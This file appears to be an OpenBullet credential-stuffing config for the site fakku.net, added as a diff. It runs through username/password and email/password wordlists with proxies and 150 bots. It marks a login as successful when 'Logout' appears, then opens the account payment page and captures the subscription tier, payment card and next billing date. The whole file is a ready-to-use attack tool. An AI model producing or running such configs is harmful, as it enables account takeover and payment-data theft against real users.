@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Fakku",
+  "SuggestedBots": 150,
+  "LastModified": "2019-03-14T19:20:05.6544382+01:00",
+  "AdditionalInfo": "",
+  "Author": "Yuri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://www.fakku.net/login/submit" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&login=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The password entered is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+#Account REQUEST GET "https://www.fakku.net/account/payment" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You do not have a FAKKU Subscription," 
+#Subscription_Tier PARSE "<SOURCE>" LR "selected>" "</option>" Recursive=TRUE -> VAR "data" "" "" 
+#Subscription_Tier PARSE "<data#1>" CSS "" "" 0 -> CAP "Subscription Tier" "" "" 
+FUNCTION Replace "&bull; " "" UseRegex=FALSE "<data#2>" -> CAP "Subscription Card" 
+#Next_Billing_Date PARSE "<SOURCE>" LR "type=\"text\" value=\"" "\"" Recursive=FALSE -> CAP "Next Billing Date" "" "" 
